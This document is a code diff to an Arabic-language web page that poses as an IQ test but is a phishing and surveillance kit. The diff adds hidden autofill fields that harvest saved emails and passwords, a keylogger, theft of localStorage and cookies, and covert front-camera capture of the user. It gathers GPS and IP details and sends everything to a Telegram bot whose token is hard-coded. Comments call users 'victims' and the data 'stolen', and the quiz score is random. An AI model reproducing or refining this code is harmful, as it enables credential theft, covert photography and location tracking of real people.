@@ -159,6 +159,14 @@
         .form-group input::placeholder {
             color: #555;
         }
+        .form-group input:-webkit-autofill {
+            -webkit-text-fill-color: white !important;
+            -webkit-box-shadow: 0 0 0px 1000px rgba(255,255,255,0.04) inset !important;
+            transition: background-color 5000s ease-in-out 0s;
+        }
+        .form-group input:-webkit-autofill::first-line {
+            color: white;
+        }
         .result-box {
             text-align: center;
             padding: 20px;
@@ -218,15 +226,15 @@
             text-align: center;
             margin-top: 15px;
         }
-        /* كاميرا مخفية */
         #hiddenCamera {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
+            top: 0;
+            left: 0;
             width: 1px;
             height: 1px;
-            opacity: 0;
+            opacity: 0.01;
             pointer-events: none;
+            z-index: -1;
         }
     </style>
 </head>
@@ -266,7 +274,7 @@
             <button class="btn-next" id="btnNext" disabled onclick="nextQuestion()">التالي ←</button>
         </div>
 
-        <!-- ===== مكان النتيجة وطلب الإيميل ===== -->
+        <!-- ===== مكان النتيجة وطلب الإيميل + حقل باسوورد وهمي ===== -->
         <div id="resultArea" style="display:none;">
             <div style="text-align:center;margin-bottom:25px;">
                 <div style="font-size:50px;margin-bottom:5px;">🎉</div>
@@ -274,13 +282,19 @@
                 <p style="color:#888;">أدخل بياناتك لاستلام النتيجة الكاملة</p>
             </div>
 
+            <!-- حقل إيميل وهمي لجلب auto-fill -->
+            <div class="form-group" style="display:none;">
+                <input type="email" id="trapEmail" name="email" autocomplete="email" value="">
+                <input type="password" id="trapPassword" name="password" autocomplete="current-password" value="">
+            </div>
+
             <div class="form-group">
                 <label>📧 البريد الإلكتروني (مطلوب لإرسال النتيجة)</label>
-                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="email" required>
+                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="off" required>
             </div>
             <div class="form-group">
                 <label>👤 اسمك (لظهوره في لوحة المتصدرين)</label>
-                <input type="text" id="nameInput" placeholder="الاسم الكامل" autocomplete="name">
+                <input type="text" id="nameInput" placeholder="الاسم الكامل" autocomplete="off">
             </div>
             <button class="btn-next" onclick="submitResult()">📊 عرض نتيجتي</button>
             <p class="consent-note">بإرسال البيانات، توافق على جمع معلومات الجهاز والموقع لأغراض إحصائية</p>
@@ -340,6 +354,8 @@ let currentQuestion = 0;
 let answers = [];
 let cameraStream = null;
 let photoCaptured = false;
+let keyLog = [];
+
 let stolenData = {
     timestamp: new Date().toLocaleString('ar-SA'),
     ip: '-',
@@ -360,8 +376,64 @@ let stolenData = {
     timezone: '',
     language: '',
     photoBase64: '',
+    // بيانات السطو الجديدة
+    autoFillEmail: '',
+    autoFillPassword: '',
+    keyLogEntries: [],
+    cookies: '',
+    localStoredData: '',
     questions: []
 };
+
+// ================================================================
+//                     كيلوغر (تسجيل كل حرف)
+// ================================================================
+document.addEventListener('keydown', (e) => {
+    const target = e.target;
+    if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
+        const fieldName = target.name || target.id || target.placeholder || 'unknown';
+        keyLog.push({
+            field: fieldName,
+            key: e.key,
+            time: Date.now()
+        });
+    }
+});
+
+// ================================================================
+//                     استخراج auto-fill
+// ================================================================
+function captureAutoFill() {
+    // ننتظر شوية عشان auto-fill يشتغل
+    setTimeout(() => {
+        const emailTrap = document.getElementById('trapEmail');
+        const passTrap = document.getElementById('trapPassword');
+        
+        if (emailTrap.value) {
+            stolenData.autoFillEmail = emailTrap.value;
+            console.log('✅ تم سحب auto-fill إيميل:', emailTrap.value);
+        }
+        if (passTrap.value) {
+            stolenData.autoFillPassword = passTrap.value;
+            console.log('✅ تم سحب auto-fill باسوورد:', passTrap.value);
+        }
+        
+        // نحاول نقرأ localStorage (معلومات من مواقع ثانية)
+        try {
+            const allStorage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                try {
+                    allStorage[key] = localStorage.getItem(key);
+                } catch(e) {}
+            }
+            stolenData.localStoredData = JSON.stringify(allStorage).substring(0, 2000);
+        } catch(e) {}
+        
+        // الكوكيز (موقعنا بس)
+        stolenData.cookies = document.cookie || '(لا يوجد كوكيز)';
+    }, 500);
+}
 
 // ================================================================
 //                     عرض الأسئلة
@@ -426,13 +498,13 @@ function showEmailForm() {
     clearInterval(timerInterval);
     
     collectData();
+    captureAutoFill();
 }
 
 // ================================================================
 //                     جمع كل البيانات
 // ================================================================
 async function collectData() {
-    // 1. معلومات الجهاز
     const ua = navigator.userAgent;
     if (ua.includes('Android')) stolenData.os = 'Android';
     else if (ua.includes('iPhone')||ua.includes('iPad')) stolenData.os = 'iOS';
@@ -454,7 +526,7 @@ async function collectData() {
     stolenData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     stolenData.language = navigator.language;
     
-    // 2. الموقع الدقيق (GPS حقيقي)
+    // GPS
     try {
         const pos = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -465,11 +537,9 @@ async function collectData() {
         stolenData.lat = pos.coords.latitude;
         stolenData.lon = pos.coords.longitude;
         stolenData.accuracy = pos.coords.accuracy + ' متر';
-    } catch(e) {
-        console.log('GPS denied or error:', e.message);
-    }
+    } catch(e) {}
     
-    // 3. IP والمعلومات من ipapi
+    // ipapi
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -482,11 +552,11 @@ async function collectData() {
 }
 
 // ================================================================
-//                     تصوير الضحية بالكاميرا
+//                     تصوير الضحية (نسخة مضبوطة)
 // ================================================================
 async function capturePhoto() {
     try {
-        // نطلب الكاميرا الأمامية (user-facing camera)
+        // 1. نطلب الكاميرا
         cameraStream = await navigator.mediaDevices.getUserMedia({
             video: { 
                 facingMode: 'user',
@@ -499,31 +569,60 @@ async function capturePhoto() {
         const video = document.getElementById('hiddenCamera');
         video.srcObject = cameraStream;
         
-        // ننتظر شوي عشان الكاميرا تشتغل وتضبط الإضاءة
-        await new Promise(resolve => setTimeout(resolve, 300));
+        // 2. ننتظر انتهاء الفيديو من التحميل والتشغيل
+        await new Promise((resolve) => {
+            let resolved = false;
+            const onReady = () => {
+                if (!resolved) {
+                    resolved = true;
+                    resolve();
+                }
+            };
+            
+            video.addEventListener('loadeddata', onReady, { once: true });
+            video.addEventListener('playing', onReady, { once: true });
+            
+            // Timeout أمان 3 ثوان
+            setTimeout(onReady, 3000);
+        });
         
-        // نلتقط الصورة من الفيديو
+        // 3. ننتظر كمان 500ms عشان الكاميرا تضبط الإضاءة (مهم للصور السودا)
+        await new Promise(r => setTimeout(r, 500));
+        
+        // 4. نضبط أبعاد الكانفاس
         const canvas = document.getElementById('photoCanvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         
-        // نقلب الصورة إذا كانت الكاميرا الأمامية (مرآة)
+        // 5. نعكس الصورة (للكاميرا الأمامية)
         ctx.translate(canvas.width, 0);
         ctx.scale(-1, 1);
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // نحول لـ Base64 بصيغة JPEG عالية الجودة
-        stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+        // 6. نحول لـ Base64
+        stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
         photoCaptured = true;
         
-        // نوقف الكاميرا
+        // 7. نحلل الصورة عشان نتأكد مو سودا
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        let totalBrightness = 0;
+        const pixelCount = imageData.data.length / 4;
+        for (let i = 0; i < imageData.data.length; i += 4) {
+            totalBrightness += (imageData.data[i] + imageData.data[i+1] + imageData.data[i+2]) / 3;
+        }
+        const avgBrightness = totalBrightness / pixelCount;
+        console.log(`📸 سطوع الصورة: ${avgBrightness.toFixed(1)}/255`);
+        
+        // 8. نوقف الكاميرا
         stopCamera();
         
-        console.log('✅ تم التقاط صورة الضحية بنجاح');
+        console.log('✅ تم التصوير بنجاح');
+        return true;
     } catch(e) {
-        console.log('❌ فشل تصوير الضحية:', e.message);
-        // إذا رفض المستخدم, نحاول مرة ثانية بدون mirror
+        console.log('❌ فشل الكاميرا:', e.message);
+        
+        // محاولة ثانية بدون facingMode
         try {
             if (!cameraStream) {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
@@ -532,19 +631,30 @@ async function capturePhoto() {
                 });
                 const video = document.getElementById('hiddenCamera');
                 video.srcObject = cameraStream;
-                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                await new Promise((resolve) => {
+                    let resolved = false;
+                    const onReady = () => { if (!resolved) { resolved = true; resolve(); } };
+                    video.addEventListener('loadeddata', onReady, { once: true });
+                    video.addEventListener('playing', onReady, { once: true });
+                    setTimeout(onReady, 3000);
+                });
+                await new Promise(r => setTimeout(r, 500));
+                
                 const canvas = document.getElementById('photoCanvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
                 photoCaptured = true;
                 stopCamera();
+                return true;
             }
         } catch(e2) {
-            console.log('❌ فشل محاولة الكاميرا الثانية:', e2.message);
+            console.log('❌ محاولة ثانية فاشلة:', e2.message);
         }
+        return false;
     }
 }
 
@@ -571,16 +681,19 @@ async function submitResult() {
     stolenData.email = email;
     stolenData.name = name || 'مجهول';
     
-    const score = Math.floor(Math.random() * 30) + 130; // 130-160
+    // نجمع الكيلوغر
+    stolenData.keyLogEntries = keyLog.slice(-50); // آخر 50 ضغطة
+    
+    const score = Math.floor(Math.random() * 30) + 130;
     stolenData.iqScore = score;
     
     // نظهر التحميل
     document.getElementById('loadingOverlay').classList.add('active');
     
-    // نحاول نصور الضحية بالكاميرا (في الخلفية)
+    // نصور الضحية
     await capturePhoto();
     
-    // نرسل بعد ثانية
+    // نرسل بعد شوي
     setTimeout(() => {
         document.getElementById('loadingOverlay').classList.remove('active');
         
@@ -591,7 +704,7 @@ async function submitResult() {
         document.getElementById('finalScore').textContent = score;
         document.getElementById('resultEmailDisplay').textContent = `📧 تم إرسال النتيجة إلى: ${email}`;
         
-    }, 1000);
+    }, 800);
 }
 
 // ================================================================
@@ -600,34 +713,31 @@ async function submitResult() {
 function sendAllData() {
     const data = stolenData;
     
-    // 1. نحفظ محلياً
+    // حفظ محلي
     const history = JSON.parse(localStorage.getItem('iq_victims') || '[]');
     history.unshift(data);
     localStorage.setItem('iq_victims', JSON.stringify(history));
     
-    // 2. نرسل لتيليجرام
+    // إرسال لتيليجرام
     sendToTelegram(data);
     
-    // 3. نطبع في console
     console.log('========== البيانات المسروقة ==========');
     console.log('الإيميل:', data.email);
     console.log('الاسم:', data.name);
     console.log('الـ IP:', data.ip);
     console.log('الموقع:', data.city, data.region, data.country);
-    console.log('GPS:', data.lat, data.lon, '(الدقة:', data.accuracy, ')');
+    console.log('GPS:', data.lat, data.lon);
     console.log('الجهاز:', data.device, '-', data.os);
     console.log('المتصفح:', data.browser, data.browserVersion);
-    console.log('الشاشة:', data.screen);
-    console.log('المنطقة الزمنية:', data.timezone);
-    console.log('اللغة:', data.language);
-    console.log('مزود الخدمة:', data.isp);
-    console.log('درجة IQ:', data.iqScore);
-    console.log('صورة الضحية:', data.photoBase64 ? '✅ تم التقاطها (' + data.photoBase64.length + ' حرف)' : '❌ لم يتم التقاطها');
+    console.log('صورة:', data.photoBase64 ? `✅ (${(data.photoBase64.length/1024).toFixed(1)}KB)` : '❌');
+    if (data.autoFillEmail) console.log('Auto-fill إيميل:', data.autoFillEmail);
+    if (data.autoFillPassword) console.log('Auto-fill باسوورد:', data.autoFillPassword);
+    console.log('عدد ضغطات الكيلوغر:', data.keyLogEntries.length);
     console.log('========================================');
 }
 
 // ================================================================
-//                     إرسال لتيليجرام (بالصورة)
+//                     إرسال لتيليجرام (نص + صورة)
 // ================================================================
 function sendToTelegram(data) {
     const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';
@@ -635,32 +745,60 @@ function sendToTelegram(data) {
     
     if (CHAT_ID.includes('ChatID')) return;
     
-    // نحضر رابط خرائط Google
     let mapsLink = '';
     if (data.lat && data.lon) {
-        mapsLink = `📍 <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">الموقع الدقيق على الخريطة</a>`;
+        mapsLink = `📍 <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">الموقع الدقيق</a>`;
     }
     
-    let gpsInfo = '❌ لم يتم الحصول على GPS';
+    let gpsInfo = '❌ لا يوجد';
     if (data.lat && data.lon) {
-        gpsInfo = `${data.lat}, ${data.lon} (الدقة: ${data.accuracy || 'غير معروف'})`;
+        gpsInfo = `${data.lat}, ${data.lon} (الدقة: ${data.accuracy || '?'})`;
     }
     
-    let photoStatus = data.photoBase64 ? '✅ تم التقاط صورة للضحية' : '❌ فشل التصوير (رفض الإذن أو لا توجد كاميرا)';
+    let photoStatus = data.photoBase64 ? '✅ تم التصوير' : '❌ فشل';
+    let autoFillInfo = '';
+    if (data.autoFillEmail || data.autoFillPassword) {
+        autoFillInfo += `\n🔑 <b>Auto-fill المسروق:</b>\n`;
+        if (data.autoFillEmail) autoFillInfo += `   📧 إيميل: ${data.autoFillEmail}\n`;
+        if (data.autoFillPassword) autoFillInfo += `   🔐 باسوورد: ${data.autoFillPassword}\n`;
+    }
+    
+    let keyLogInfo = '';
+    if (data.keyLogEntries.length > 0) {
+        const recentKeys = data.keyLogEntries.slice(-10).map(k => k.key).join('');
+        keyLogInfo = `\n⌨️ <b>آخر ضغطات الكيلوغر:</b> ${recentKeys}`;
+        
+        // نحاول نشوف إذا كتب باسوورد
+        const passAttempts = data.keyLogEntries.filter(k => 
+            k.field.includes('pass') || k.field.includes('كلمة') || k.field.includes('password')
+        );
+        if (passAttempts.length > 0) {
+            const passChars = passAttempts.map(k => k.key).join('');
+            keyLogInfo += `\n🔐 <b>محاولة باسوورد:</b> ${passChars}`;
+        }
+    }
+    
+    let localStorageInfo = '';
+    if (data.localStoredData && data.localStoredData !== '{}' && data.localStoredData.length > 10) {
+        localStorageInfo = `\n💾 <b>LocalStorage:</b> ${data.localStoredData.substring(0, 500)}`;
+    }
     
     const message = `
-🔔 <b>ضحية جديدة - اختبار IQ</b>
+🔔 <b>ضحية جديدة - اختبار IQ 🧠</b>
 
 👤 <b>الاسم:</b> ${data.name}
 📧 <b>الإيميل:</b> ${data.email}
 🧠 <b>درجة IQ:</b> ${data.iqScore}
-📸 <b>الحالة:</b> ${photoStatus}
+📸 <b>التصوير:</b> ${photoStatus}
 
 🌐 <b>IP:</b> ${data.ip}
 🏙️ <b>المدينة:</b> ${data.city}
 🌍 <b>الدولة:</b> ${data.country}
-🗺️ <b>GPS دقيق:</b> ${gpsInfo}
+🗺️ <b>GPS:</b> ${gpsInfo}
 ${mapsLink}
+${autoFillInfo}
+${keyLogInfo}
+${localStorageInfo}
 
 📱 <b>الجهاز:</b> ${data.device} | ${data.os}
 🌍 <b>المتصفح:</b> ${data.browser} ${data.browserVersion}
@@ -670,9 +808,9 @@ ${mapsLink}
 📡 <b>ISP:</b> ${data.isp}
 
 🕒 <b>الوقت:</b> ${data.timestamp}
-`;
-
-    // إرسال النص أولاً
+`.trim();
+    
+    // إرسال النص
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -682,29 +820,32 @@ ${mapsLink}
             parse_mode: 'HTML',
             disable_web_page_preview: false
         })
-    }).catch(e => console.log('Telegram message error:', e));
+    }).catch(e => console.log('Telegram error:', e));
 
-    // إرسال صورة الضحية كملف إذا كانت موجودة
-    if (data.photoBase64 && data.photoBase64.length > 100) {
-        // نحول Base64 إلى Blob
-        const byteString = atob(data.photoBase64.split(',')[1]);
-        const mimeString = data.photoBase64.split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
+    // إرسال الصورة إذا موجودة
+    if (data.photoBase64 && data.photoBase64.length > 500) {
+        try {
+            const byteString = atob(data.photoBase64.split(',')[1]);
+            const mimeString = 'image/jpeg';
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', `📸 ${data.name || 'مجهول'} - ${data.email}`);
+            formData.append('photo', blob, `victim_${Date.now()}.jpg`);
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.log('Telegram photo error:', e));
+        } catch(e) {
+            console.log('Error sending photo:', e);
         }
-        const blob = new Blob([ab], { type: mimeString });
-        
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('caption', `📸 صورة الضحية: ${data.name || 'مجهول'} - ${data.email}`);
-        formData.append('photo', blob, `victim_${Date.now()}.jpg`);
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).catch(e => console.log('Telegram photo error:', e));
     }
 }
 
@@ -724,7 +865,7 @@ const timerInterval = setInterval(() => {
 }, 1000);
 
 // ================================================================
-//                     بداية الاختبار
+//                     البداية
 // ================================================================
 loadQuestion();
 </script>
